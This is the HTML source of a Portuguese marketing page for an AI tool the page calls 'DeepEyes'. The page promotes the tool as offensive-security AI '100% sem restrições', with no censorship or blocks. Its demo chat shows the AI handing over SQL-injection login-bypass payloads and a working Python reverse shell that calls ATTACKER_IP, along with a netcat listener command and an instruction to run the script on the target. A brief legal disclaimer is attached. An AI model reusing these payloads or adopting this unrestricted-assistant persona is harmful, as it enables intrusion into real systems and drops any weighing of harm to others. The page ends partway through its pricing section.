        .pricing-card.popular {
            border-color: var(--accent-cyan);
            background: linear-gradient(180deg, rgba(0, 212, 255, 0.05) 0%, var(--bg-card) 100%);
        }

        .pricing-card.premium {
            border-color: var(--accent-purple);
            background: linear-gradient(180deg, rgba(139, 92, 246, 0.05) 0%, var(--bg-card) 100%);
        }

        .popular-badge {
            position: absolute;
            top: -12px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            color: var(--bg-primary);
            font-size: 0.7rem;
            font-weight: 700;
            padding: 6px 16px;
            border-radius: 20px;
            letter-spacing: 0.5px;
        }

        .pricing-header {
            text-align: center;
            margin-bottom: 24px;
            padding-bottom: 24px;
            border-bottom: 1px solid var(--border-color);
        }

        .pricing-badge {
            display: inline-block;
            font-size: 0.7rem;
            font-weight: 600;
            padding: 4px 12px;
            border-radius: 20px;
            background: rgba(0, 255, 136, 0.1);
            color: var(--accent-green);
            margin-bottom: 12px;
            letter-spacing: 1px;
        }

        .pricing-badge.redteam {
            background: rgba(249, 115, 22, 0.1);
            color: #f97316;
        }

        .pricing-badge.fullattack {
            background: rgba(139, 92, 246, 0.1);
            color: var(--accent-purple);
        }

        .pricing-name {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 16px;
        }

        .pricing-price {
            display: flex;
            align-items: baseline;
            justify-content: center;
            gap: 4px;
            margin-bottom: 8px;
        }

        .price-currency {
            font-size: 1.25rem;
            color: var(--text-secondary);
        }

        .price-value {
            font-size: 3rem;
            font-weight: 800;
            color: var(--text-primary);
            line-height: 1;
        }

        .price-period {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .pricing-description {
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .pricing-features {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }

        .feature-item {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 0.9rem;
        }

        .feature-item.included {
            color: var(--text-primary);
        }

        .feature-item.included i {
            color: var(--accent-green);
        }

        .feature-item.excluded {
            color: var(--text-secondary);
            opacity: 0.5;
        }

        .feature-item.excluded i {
            color: #ef4444;
        }

        .pricing-btn {
            display: block;
            width: 100%;
            padding: 14px 24px;
            text-align: center;
            border-radius: 12px;
            font-weight: 600;
            font-size: 0.9rem;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .pricing-btn.basic {
            background: rgba(0, 255, 136, 0.1);
            color: var(--accent-green);
            border: 1px solid rgba(0, 255, 136, 0.3);
        }

        .pricing-btn.basic:hover {
            background: rgba(0, 255, 136, 0.2);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
        }

        .pricing-btn.redteam {
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            color: var(--bg-primary);
        }

        .pricing-btn.redteam:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(0, 212, 255, 0.4);
        }

        .pricing-btn.fullattack {
            background: linear-gradient(135deg, var(--accent-purple), #ec4899);
            color: white;
        }

        .pricing-btn.fullattack:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(139, 92, 246, 0.4);
        }

        .pricing-note {
            text-align: center;
            margin-top: 40px;
            font-size: 0.85rem;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .pricing-note i {
            color: var(--accent-cyan);
        }

        @media (max-width: 900px) {
            .pricing-grid {
                grid-template-columns: 1fr;
                max-width: 400px;
            }

            .pricing-card.popular {
                order: -1;
            }
        }
        
        @media (max-width: 500px) {
            .pricing {
                padding: 60px 15px;
            }
            
            .pricing-grid {
                max-width: 100%;
                gap: 20px;
            }
            
            .pricing-card {
                padding: 25px 20px;
            }
            
            .pricing-price {
                font-size: 2rem;
            }
            
            .pricing-features li {
                font-size: 0.85rem;
            }
        }

        /* ========================================
           FAQ
           ======================================== */
        .faq {
            padding: 100px 20px;
            backdrop-filter: blur(10px);
        }

        .faq-list {
            max-width: 700px;
            margin: 0 auto;
        }

        .faq-item {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            margin-bottom: 12px;
            overflow: hidden;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .faq-item:hover {
            border-color: var(--accent-cyan);
        }

        .faq-item.open {
            border-color: var(--accent-cyan);
        }

        .faq-question {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 24px;
            font-weight: 600;
            font-size: 1rem;
        }

        .faq-icon {
            font-size: 1.5rem;
            color: var(--accent-cyan);
            transition: transform 0.3s ease;
        }

        .faq-answer {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease, padding 0.3s ease;
        }

        .faq-item.open .faq-answer {
            max-height: 300px;
            padding: 0 24px 20px;
        }

        .faq-answer p {
            color: var(--text-secondary);
            font-size: 0.95rem;
            line-height: 1.7;
        }

        /* ========================================
           SOCIAL PROOF
           ======================================== */
        .social-proof {
            padding: 100px 20px;
        }

        .trust-text {
            text-align: center;
            color: var(--accent-cyan);
            font-size: 0.9rem;
            margin-bottom: 40px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .logos-grid {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
            margin-bottom: 60px;
            padding: 30px;
            border-top: 1px solid var(--border-color);
            border-bottom: 1px solid var(--border-color);
        }

        .logo-item {
            color: var(--text-secondary);
            font-size: 1rem;
            opacity: 0.6;
            transition: all 0.3s ease;
        }

        .logo-item:hover {
            opacity: 1;
            color: var(--accent-cyan);
        }

        /* ========================================
           FOOTER
           ======================================== */
        .footer {
            padding: 80px 20px 40px;
            background: linear-gradient(180deg, var(--bg-primary) 0%, rgba(18, 18, 26, 0.95) 100%);
            border-top: 1px solid var(--border-color);
        }

        .footer-grid {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1fr;
            gap: 60px;
            margin-bottom: 60px;
        }

        .footer-brand {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .footer-logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .footer-logo .logo-img {
            width: 40px;
            height: 40px;
            object-fit: contain;
            filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));
        }

        .footer-logo .logo-text {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 600;
            font-size: 1.4rem;
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .footer-description {
            color: var(--text-secondary);
            font-size: 0.9rem;
            line-height: 1.7;
            max-width: 300px;
        }

        .footer-social {
            display: flex;
            gap: 12px;
            margin-top: 8px;
        }

        .footer-social a {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 10px;
            color: var(--text-secondary);
            transition: all 0.3s ease;
        }

        .footer-social a:hover {
            background: rgba(0, 212, 255, 0.2);
            border-color: var(--accent-cyan);
            color: var(--accent-cyan);
            transform: translateY(-2px);
        }

        .footer-column h4 {
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--accent-cyan);
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 20px;
        }

        .footer-column ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .footer-column li {
            margin-bottom: 12px;
        }

        .footer-column a {
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.9rem;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .footer-column a:hover {
            color: var(--accent-cyan);
            transform: translateX(4px);
        }

        .footer-column a svg {
            width: 16px;
            height: 16px;
            opacity: 0.6;
        }

        .footer-bottom {
            padding-top: 30px;
            border-top: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
        }

        .copyright {
            color: var(--text-secondary);
            font-size: 0.85rem;
        }

        .footer-legal {
            display: flex;
            gap: 24px;
        }

        .footer-legal a {
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.85rem;
            transition: color 0.3s ease;
        }

        .footer-legal a:hover {
            color: var(--accent-cyan);
        }

        @media (max-width: 900px) {
            .footer-grid {
                grid-template-columns: 1fr 1fr;
                gap: 40px;
            }
        }

        @media (max-width: 600px) {
            .footer-grid {
                grid-template-columns: 1fr;
                gap: 40px;
                text-align: center;
            }
            
            .footer-brand {
                align-items: center;
            }
            
            .footer-description {
                max-width: 100%;
            }
            
            .footer-social {
                justify-content: center;
            }
            
            .footer-column a {
                justify-content: center;
            }
            
            .footer-bottom {
                flex-direction: column;
                text-align: center;
            }
            
            .footer-legal {
                justify-content: center;
            }
        }
        
        /* ========================================
           GLOBAL MOBILE FIXES
           ======================================== */
        @media (max-width: 480px) {
            .container {
                padding: 0 15px;
            }
            
            .section-header {
                margin-bottom: 40px;
            }
            
            .section-title {
                font-size: 1.5rem;
            }
            
            .section-subtitle,
            .section-description {
                font-size: 0.9rem;
            }
            
            /* CTA Section */
            .cta {
                padding: 60px 15px;
            }
            
            .cta-title {
                font-size: 1.5rem;
            }
            
            .cta-subtitle {
                font-size: 0.9rem;
            }
            
            /* How it works */
            .how-it-works {
                padding: 60px 15px;
            }
            
            .modes-grid {
                gap: 15px;
            }
            
            .mode-card {
                padding: 20px;
            }
            
            .mode-title {
                font-size: 1.1rem;
            }
            
            .mode-description {
                font-size: 0.85rem;
            }
            
            /* Features */
            .features {
                padding: 60px 15px;
            }
            
            .features-grid {
                gap: 15px;
            }
            
            .feature-card {
                padding: 20px;
            }
            
            /* FAQ */
            .faq {
                padding: 60px 15px;
            }
            
            .faq-item {
                padding: 15px;
            }
            
            .faq-question {
                font-size: 0.95rem;
            }
            
            .faq-answer {
                font-size: 0.85rem;
            }
            
            /* Footer */
            .footer {
                padding: 40px 15px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Ghost Background Effect -->
        <canvas id="ghost-background"></canvas>
        
        <!-- Global Background with Pixel Snow -->
        <div class="global-background">
            <!-- Pixel snow removido - usando apenas ghost background -->
        </div>
        
        <div class="content-wrapper">
            <!-- Navbar -->
            <nav class="navbar">
                <div class="navbar-container">
                    <a href="/" class="navbar-logo">
                        <img src="/logo.png" alt="DeepEyes" style="width: 36px; height: 36px; object-fit: contain;">
                        <span class="logo-text">DeepEyes</span>
                    </a>

                    <div class="navbar-links" id="navLinks">
                        <a href="#como-funciona">Como Funciona</a>
                        <a href="#recursos">Recursos</a>
                        <a href="#precos">Preços</a>
                        <a href="/docs">Docs</a>
                        <a href="#faq">FAQ</a>
                    </div>

                    <div class="navbar-actions">
                        <a href="/chat" class="btn-enter">Entrar no Lab</a>
                    </div>

                    <button class="navbar-toggle" onclick="toggleNav()">
                        <span id="navIcon">☰</span>
                    </button>
                </div>
            </nav>

            <!-- Hero Section -->
            <div class="fade-section">
                <section class="hero">
                    <div class="hero-content">
                        
                        <h1 class="hero-title">
                            <span class="hero-welcome">Bem-vindo ao</span>
                            <span class="highlight fuzzy-text" data-text="DeepEyes">DeepEyes</span>
                            <span class="subtitle">sua IA de segurança ofensiva</span>
                        </h1>
                        
                        <p class="hero-description">
                            Pentest. Red Team. Simulações APT. Tudo em um laboratório controlado.
                        </p>
                        
                        <div class="hero-actions">
                            <a href="/chat" class="btn-primary">
                                <span class="btn-glow"></span>
                                › Entrar no Laboratório
                            </a>
                            <a href="/docs" class="btn-secondary mono">
                                Ver Documentação
                            </a>
                        </div>

                        <div class="hero-terminal mono">
                            <div class="terminal-header">
                                <span class="dot red"></span>
                                <span class="dot yellow"></span>
                                <span class="dot green"></span>
                                <span class="terminal-title">deepeyes@lab:~</span>
                            </div>
                            <div class="terminal-body">
                                <p><span class="prompt">$</span> deepeyes --init --mode=pentest</p>
                                <p class="output">[+] Conectando ao DeepEyes Core...</p>
                                <p class="output">[+] Carregando módulos de ataque...</p>
                                <p class="output">[+] IA pronta para operação</p>
                                <p><span class="prompt">$</span> <span class="cursor">_</span></p>
                            </div>
                        </div>
                    </div>
                </section>
            </div>

            <!-- No Restrictions Section -->
            <div class="fade-section">
                <section class="no-restrictions">
                    <div class="container">
                        <div class="nr-content">
                            <h2 class="nr-title">
                                IA <span class="highlight fuzzy-text" data-text="100% Sem Restrições">100% Sem Restrições</span>
                            </h2>
                            
                            <p class="nr-subtitle">
                                Diferente de outras IAs, o DeepEyes foi construído para profissionais. 
                                Sem censura, sem bloqueios, sem limitações.
                            </p>

                            <div class="nr-grid">
                                <div class="nr-card">
                                    <div class="nr-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
                                    </div>
                                    <h3>Zero Censura</h3>
                                    <p>Acesso completo a todas as técnicas e payloads sem filtros.</p>
                                </div>
                                <div class="nr-card">
                                    <div class="nr-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
                                    </div>
                                    <h3>Sem Bloqueios</h3>
                                    <p>A IA responde qualquer pergunta sobre segurança ofensiva.</p>
                                </div>
                                <div class="nr-card">
                                    <div class="nr-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8V4H8"/><rect width="16" height="12" x="4" y="8" rx="2"/><path d="M2 14h2"/><path d="M20 14h2"/><path d="M15 13v2"/><path d="M9 13v2"/></svg>
                                    </div>
                                    <h3>IA Especializada</h3>
                                    <p>Treinada para operações de Red Team e Pentest.</p>
                                </div>
                                <div class="nr-card">
                                    <div class="nr-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/></svg>
                                    </div>
                                    <h3>Arsenal Completo</h3>
                                    <p>Exploits, bypasses e evasões disponíveis sem limites.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>

            <!-- How It Works Section -->
            <div class="fade-section">
                <section id="como-funciona" class="how-it-works">
                    <div class="container">
                        <div class="section-header">
                            <span class="section-tag mono">// COMO FUNCIONA</span>
                            <h2 class="section-title">Três modos de operação</h2>
                            <p class="section-subtitle">Escolha o nível de automação e agressividade para sua operação</p>
                        </div>

                        <div class="modes-grid">
                            <div class="mode-card">
                                <div class="mode-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/><path d="M11 8v6"/><path d="M8 11h6"/></svg>
                                </div>
                                <h3 class="mode-title">Pentest Assistido por IA</h3>
                                <p class="mode-description">A IA guia você através de testes de penetração, sugerindo vetores de ataque e automatizando reconhecimento.</p>
                                <ul class="mode-features">
                                    <li class="mono"><span class="check">›</span> Reconhecimento automatizado</li>
                                    <li class="mono"><span class="check">›</span> Sugestões inteligentes</li>
                                    <li class="mono"><span class="check">›</span> Relatórios detalhados</li>
                                </ul>
                            </div>
                            <div class="mode-card">
                                <div class="mode-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>
                                </div>
                                <h3 class="mode-title">Red Team com Simulação Real</h3>
                                <p class="mode-description">Simule ataques reais com técnicas avançadas de evasão e persistência em ambientes controlados.</p>
                                <ul class="mode-features">
                                    <li class="mono"><span class="check">›</span> Técnicas de evasão</li>
                                    <li class="mono"><span class="check">›</span> Simulação de APT</li>
                                    <li class="mono"><span class="check">›</span> Cenários customizados</li>
                                </ul>
                            </div>
                            <div class="mode-card">
                                <div class="mode-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/></svg>
                                </div>
                                <h3 class="mode-title">Modo Full Attack</h3>
                                <p class="mode-description">Ofensiva máxima com todas as técnicas disponíveis. Para profissionais experientes em ambientes autorizados.</p>
                                <ul class="mode-features">
                                    <li class="mono"><span class="check">›</span> Exploração automatizada</li>
                                    <li class="mono"><span class="check">›</span> Privilege escalation</li>
                                    <li class="mono"><span class="check">›</span> Lateral movement</li>
                                </ul>
                            </div>
                        </div>

                    </div>
                </section>
            </div>

            <!-- Features Section -->
            <div class="fade-section">
                <section id="recursos" class="features">
                    <div class="container">
                        <div class="section-header">
                            <span class="section-tag mono">// RECURSOS DA IA</span>
                            <h2 class="section-title">Arsenal completo de técnicas</h2>
                            <p class="section-subtitle">Todas as ferramentas que você precisa para testes de segurança ofensiva</p>
                        </div>

                        <div class="features-grid">
                            <div class="feature-card">
                                <div class="feature-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></svg>
                                </div>
                                <h3 class="feature-title">SQL Injection</h3>
                                <p class="feature-description">Detecção e exploração automatizada de vulnerabilidades SQLi em aplicações web.</p>
                            </div>
                            <div class="feature-card">
                                <div class="feature-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
                                </div>
                                <h3 class="feature-title">Reverse Shells</h3>
                                <p class="feature-description">Geração de payloads customizados para múltiplas plataformas e linguagens.</p>
                            </div>
                            <div class="feature-card">
                                <div class="feature-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="m3 8 4-4 4 4"/><path d="M7 4v16"/><path d="M11 12h4"/><path d="M11 16h7"/><path d="M11 20h10"/></svg>
                                </div>
                                <h3 class="feature-title">Privilege Escalation</h3>
                                <p class="feature-description">Técnicas avançadas de escalação de privilégios em Windows e Linux.</p>
                            </div>
                            <div class="feature-card">
                                <div class="feature-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m4.243 5.21 14.39 12.472"/></svg>
                                </div>
                                <h3 class="feature-title">Evasão de EDR/AMSI/WAF</h3>
                                <p class="feature-description">Bypass de soluções de segurança com técnicas de ofuscação e evasão.</p>
                            </div>
                            <div class="feature-card">
                                <div class="feature-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
                                </div>
                                <h3 class="feature-title">Simulação APT</h3>
                                <p class="feature-description">Frameworks C2 integrados para simulações de ameaças persistentes avançadas.</p>
                            </div>
                            <div class="feature-card">
                                <div class="feature-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4"/><path d="m21 2-9.6 9.6"/><circle cx="7.5" cy="15.5" r="5.5"/></svg>
                                </div>
                                <h3 class="feature-title">Password Attacks</h3>
                                <p class="feature-description">Ataques de força bruta, spray e cracking com wordlists inteligentes.</p>
                            </div>
                        </div>
                    </div>
                </section>
            </div>

            <!-- Chat Demo Section -->
            <div class="fade-section">
                <section id="demo" class="chat-demo">
                    <div class="container">
                        <div class="section-header">
                            <span class="section-tag mono">// DEMO INTERATIVA</span>
                            <h2 class="section-title">Veja a IA em ação</h2>
                            <p class="section-subtitle">Exemplo real de como o DeepEyes responde às suas perguntas</p>
                        </div>

                        <div class="chat-container">
                            <div class="chat-header">
                                <div class="chat-header-left">
                                    <img src="/logo.png" alt="DeepEyes" class="chat-logo">
                                    <div>
                                        <div class="chat-title">DeepEyes AI</div>
                                        <div class="chat-status">
                                            <span class="status-dot"></span>
                                            <span class="mono">Online • Modo Pentest</span>
                                        </div>
                                    </div>
                                </div>
                                <span class="chat-mode-badge">Pentest</span>
                            </div>

                            <div class="chat-messages">
                                <div class="demo-message user">
                                    <div class="demo-avatar user">👤</div>
                                    <div class="demo-bubble">
                                        <pre>Como fazer bypass de autenticação em um login?</pre>
                                    </div>
                                </div>
                                
                                <div class="demo-message ai">
                                    <div class="demo-avatar ai">🤖</div>
                                    <div class="demo-bubble">
                                        <pre>Existem várias técnicas para bypass de autenticação. As mais comuns são:

<strong>1. SQL Injection</strong>
Teste payloads como:</pre>
                                        <div class="code-block">
                                            <code>' OR '1'='1' --
' OR 1=1 --
admin'--
' OR ''='</code>
                                        </div>
                                        <pre><strong>2. Default Credentials</strong>
Verifique credenciais padrão: admin/admin, root/root, test/test

<strong>3. Session Hijacking</strong>
Capture cookies de sessão via XSS ou MITM

<strong>4. Password Spraying</strong>
Teste senhas comuns em múltiplos usuários

Qual técnica você gostaria que eu detalhasse?</pre>
                                    </div>
                                </div>

                                <div class="demo-message user">
                                    <div class="demo-avatar user">👤</div>
                                    <div class="demo-bubble">
                                        <pre>Gere um reverse shell em Python para Linux</pre>
                                    </div>
                                </div>
                                
                                <div class="demo-message ai">
                                    <div class="demo-avatar ai">🤖</div>
                                    <div class="demo-bubble">
                                        <pre>Aqui está um reverse shell em Python:</pre>
                                        <div class="code-block">
                                            <code>import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])</code>
                                        </div>
                                        <pre><strong>Para usar:</strong>
1. Substitua ATTACKER_IP pelo seu IP
2. Inicie um listener: <code>nc -lvnp 4444</code>
3. Execute o script no alvo</pre>
                                        <div class="warning">⚠️ Use apenas em ambientes autorizados para testes de segurança.</div>
                                    </div>
                                </div>
                            </div>

                            <div class="chat-input-demo">
                                <input type="text" placeholder="Digite sua pergunta de segurança..." class="mono" disabled>
                                <button class="chat-send-btn">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/></svg>
                                </button>
                            </div>
                        </div>
                    </div>
                </section>
            </div>

            <!-- Disclaimer Section -->
            <div class="fade-section">
                <section class="disclaimer">
                    <div class="container">
                        <div class="disclaimer-box">
                            <div class="disclaimer-icon">⚠️</div>
                            <p class="disclaimer-text">
                                <strong>Aviso Legal:</strong> O DeepEyes é uma ferramenta para profissionais de segurança. 
                                Use apenas em ambientes autorizados. O operador é totalmente responsável pelo uso da plataforma.
                            </p>
                        </div>
                    </div>
                </section>
            </div>

            <!-- CTA Section -->
            <div class="fade-section">
                <section class="cta">
                    <div class="container">
                        <div class="cta-content">
                            <div class="cta-badge">
                                <span class="pulse-dot"></span>
                                Vagas limitadas no BETA
                            </div>
                            <h2 class="cta-title">
                                Pronto para elevar seu <span class="highlight fuzzy-text" data-text="pentest">pentest</span>
                            </h2>
                            <p class="cta-subtitle">
                                Junte-se a centenas de profissionais que já usam o DeepEyes para testes de segurança ofensiva em ambientes controlados.
                            </p>
                            <div class="cta-actions">
                                <a href="/chat" class="cta-button">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/></svg>
                                    Começar Agora — É Grátis
                                </a>
                                <a href="#como-funciona" class="cta-button-secondary">
                                    Ver como funciona
                                </a>
                            </div>
                            <p class="cta-note">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
                                Sem cartão de crédito • Acesso imediato
                            </p>
                        </div>
                    </div>
                </section>
            </div>

            <!-- Pricing Section -->
            <div class="fade-section">
                <section id="precos" class="pricing-section">
                    <div class="container">
                        <div class="section-header">
                            <span class="section-tag mono">// PLANOS</span>
                            <h2 class="section-title">Escolha seu <span class="highlight fuzzy-text" data-text="Plano">Plano</span></h2>
                            <p class="section-description">Selecione o plano ideal para suas necessidades de segurança ofensiva</p>
                        </div>

                        <div class="pricing-grid">
                            <!-- Plano Básico -->
                            <div class="pricing-card">
                                <div class="pricing-header">
                                    <span class="pricing-badge">BÁSICO</span>
                                    <h3 class="pricing-name">Pentest</h3>
                                    <div class="pricing-price">
                                        <span class="price-currency">R$</span>
                                        <span class="price-value">0</span>
                                        <span class="price-period">/mês</span>
                                    </div>
                                    <p class="pricing-description">Ideal para iniciantes e estudantes</p>
                                </div>
                                <div class="pricing-features">
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Perfil Pentest</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Chat com IA</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>10 requisições/dia</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>1 sessão de chat</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Terminal Integrado</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Scanner de Vulnerabilidades</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Checklist OWASP</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Geração de Relatórios</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Perfil Red Team</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Perfil Full Attack</span>
                                    </div>
                                </div>
                                <a href="/chat" class="pricing-btn basic">Começar Grátis</a>
                            </div>

                            <!-- Plano Red Team -->
                            <div class="pricing-card popular">
                                <div class="popular-badge">MAIS POPULAR</div>
                                <div class="pricing-header">
                                    <span class="pricing-badge redteam">RED TEAM</span>
                                    <h3 class="pricing-name">Red Team</h3>
                                    <div class="pricing-price">
                                        <span class="price-currency">R$</span>
                                        <span class="price-value">49</span>
                                        <span class="price-period">/mês</span>
                                    </div>
                                    <p class="pricing-description">Para profissionais de segurança</p>
                                </div>
                                <div class="pricing-features">
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Perfil Pentest + Red Team</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
